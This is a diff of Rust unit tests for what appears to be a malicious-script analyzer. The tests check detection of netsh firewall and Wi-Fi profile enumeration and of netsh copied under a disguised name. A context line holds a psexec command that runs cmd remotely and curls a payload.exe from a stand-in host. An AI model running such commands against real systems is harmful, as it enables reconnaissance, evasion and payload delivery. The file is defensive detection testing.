@@ -4562,6 +4562,52 @@ C:\Users\Public\sc.tmp query state= all
     }
 
     #[test]
+    fn netsh_show_emits_enumeration_trait() {
+        let report = analyze(
+            br#"netsh advfirewall show allprofiles state"#,
+            &AnalyzeConfig::default(),
+        );
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Enumeration { enum_kind, command }
+                    if enum_kind == "netsh-show"
+                        && command == "netsh advfirewall show allprofiles state"
+            )),
+            "netsh show enumeration was not surfaced: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn copied_netsh_alias_show_emits_enumeration_trait() {
+        let script = br#"copy C:\Windows\System32\netsh.exe C:\Users\Public\ns.tmp
+C:\Users\Public\ns.tmp wlan show profiles
+"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ManipulatedExec { target, .. }
+                    if target.eq_ignore_ascii_case(r#"C:\Users\Public\ns.tmp"#)
+            )),
+            "copied netsh alias was not surfaced: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Enumeration { enum_kind, command }
+                    if enum_kind == "netsh-show" && command == "netsh.exe wlan show profiles"
+            )),
+            "copied netsh show enumeration was not surfaced: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn psexec_replays_remote_cmd_child() {
         let script = br#"psexec \\target.example -u admin -p pass cmd.exe /V:ON /c set U=https://psexec-wrapper.example/payload.exe&&curl -o payload.exe !U!"#;
         let report = analyze(script, &AnalyzeConfig::default());
